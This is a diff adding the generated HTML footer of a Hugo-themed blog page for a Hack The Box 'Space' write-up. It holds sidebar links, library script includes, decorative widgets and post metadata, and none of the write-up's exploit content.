+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/ctf"
+        aria-label="CTFs"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">CTFs</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script><script>
+  function initLive2d() {
+    live2d.init('https:\/\/fastly.jsdelivr.net\/gh\/D-Sketon\/plugin-live2d\/', {themeTipsPath: ""});
+  }
+</script><script
+    src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js"
+    asynconload="initLive2d()"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "0xFl",
+          title: "Space – HTB Challenge",
+          url: "https:\/\/0xFlp.github.io\/post\/space\/",
+          description: " Challenge Description roaming in a small space This challenge is a classic shellcode injection on a 32-bit binary with minimal protections. The main constraint is the very limited space available for our attack.\nInitial Recon Checking the file:\n$ file space space: ELF 32-bit LSB executable, Intel …",
+          cover: "https:\/\/0xFlp.github.io\/images\/CTFs_images\/hackthebox.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
